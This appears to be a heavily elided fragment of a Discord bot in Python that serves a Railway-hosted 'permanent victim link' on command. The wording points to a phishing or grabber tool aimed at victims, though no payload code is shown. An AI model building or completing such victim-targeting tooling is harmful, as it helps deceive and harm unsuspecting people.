...
# === RAILWAY PUBLIC URL (auto-detects your Railway domain) ===
...
async def on_ready():
    ...
    print(f"🌐 Your permanent victim link: {PUBLIC_URL}")
...
async def on_message(message):
    ...
    if content in (";create", ";link"):
        await channel.send(embed=discord.Embed(description=f"`{PUBLIC_URL}`", color=EMBED_COLOR))
        return

    if content == ";refresh":
        await channel.send(embed=discord.Embed(description="**Railway link is permanent — no refresh needed, my king**", color=EMBED_COLOR))
        return
